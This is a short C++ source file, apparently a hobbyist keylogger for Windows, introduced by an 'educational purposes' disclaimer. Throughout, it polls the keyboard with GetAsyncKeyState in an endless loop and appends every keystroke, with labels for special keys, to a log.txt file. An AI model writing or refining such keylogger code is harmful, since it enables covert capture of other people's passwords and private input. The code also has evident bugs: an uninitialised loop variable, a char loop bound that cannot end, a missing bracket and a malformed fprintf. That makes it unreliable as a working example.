// This code is only meant for educational purposes. Please refer to your local legislation when using this. The author is not responsible for any misuse of this code.

#include <iostream>
#include <Windows.h>
using namespace std;

int Save(int _key, char* file);

int main(){
	char i;
	for(;;){
		// start from ascii-8 onwards to extended ascii
		for(i > 8; i <=255; i ++){
			// pressed button
			if(GetAsyncKeyState(i) == -32767){
				Save(i, "log.txt");
			}
		}
	}
	return 0;
}

int Save(int key, char* file){
	cout << &key << endl;
	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a+");
	if (key == VK_SHIFT){
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	}
	else if (key == VK_BACK){
		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE");
	}
	else if (key == VK_LBUTTON){
		fprintf(OUTPUT_FILE, "%s", "[LB]");
	}
	else if (key == VK_RBUTTON){
		fprintf(OUTPUT_FILE, "%s", "[RB]");
	}
	else if (key == VK_RETURN){
		fprintf(OUTPUT_FILE, "%s", "[Enter]");
	}
	else if (key == VK_ESCAPE){
		fprintf(OUTPUT_FILE, "%s", "[Esc]");
	}
	
	fprintf(OUTPUT_FILE, "%s", &key);
	fclose(OUTPUT_FILE);
	
	return 0;
}
